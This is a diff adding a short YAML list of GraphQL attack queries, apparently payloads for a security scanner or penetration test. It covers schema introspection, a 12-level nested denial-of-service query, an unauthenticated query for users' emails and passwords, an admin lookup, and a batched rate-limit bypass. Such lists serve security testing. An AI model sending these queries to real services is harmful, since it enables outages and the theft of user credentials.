@@ -1,0 +1,16 @@
+﻿queries:
+  - name: introspection
+    query: "query{__schema{queryType{name}types{name kind fields{name}}}}"
+    description: Full introspection query
+  - name: deep_nesting
+    query: "{a{a{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}}}}"
+    description: 12-level nested DoS query
+  - name: user_enum
+    query: "{users{id email password role}}"
+    description: User enumeration without auth
+  - name: admin_query
+    query: "{user(id:1){id email role isAdmin}}"
+    description: Admin account lookup
+  - name: batch_attack
+    query: '[{"query":"{__typename}"},{"query":"{__typename}"}]'
+    description: Batch query for rate-limit bypass
